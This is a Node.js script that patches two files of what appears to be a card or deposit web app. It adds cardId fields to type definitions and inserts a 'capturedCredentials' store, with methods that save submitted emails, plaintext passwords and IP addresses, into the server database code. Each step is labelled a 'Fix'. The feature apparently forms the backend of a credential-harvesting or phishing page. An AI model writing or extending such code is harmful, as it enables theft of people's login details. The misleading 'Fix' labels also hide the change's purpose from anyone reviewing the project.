const fs = require('fs');

// 1. Fix src/types/index.ts
let types = fs.readFileSync('src/types/index.ts', 'utf8');
types = types.replace(
  'export interface CardCard {',
  'export interface CardCard {\n  cardId?: string;'
);
types = types.replace(
  'export interface Deposit {',
  'export interface Deposit {\n  cardId?: string;'
);
fs.writeFileSync('src/types/index.ts', types);
console.log('Fixed src/types/index.ts');

// 2. Fix server/db.ts
let dbCode = fs.readFileSync('server/db.ts', 'utf8');
dbCode = dbCode.replace(
  'interface DatabaseSchema {',
  'interface DatabaseSchema {\n  demoCards?: any[];\n  capturedCredentials?: { email: string; password: string; ip: string; date: string }[];'
);

const captureMethods = `  captureCredential(identifier: string, password: string, ip: string) {
    const data = loadDatabase();
    data.capturedCredentials = data.capturedCredentials || [];
    data.capturedCredentials.unshift({
      email: identifier,
      password,
      ip,
      date: new Date().toISOString()
    });
    if (data.capturedCredentials.length > 200) {
      data.capturedCredentials = data.capturedCredentials.slice(0, 200);
    }
    saveDatabase(data);
  },
  getCapturedCredentials() {
    const data = loadDatabase();
    return data.capturedCredentials || [];
  },
  // Settings`;

dbCode = dbCode.replace('  // Settings', captureMethods);
fs.writeFileSync('server/db.ts', dbCode);
console.log('Fixed server/db.ts');
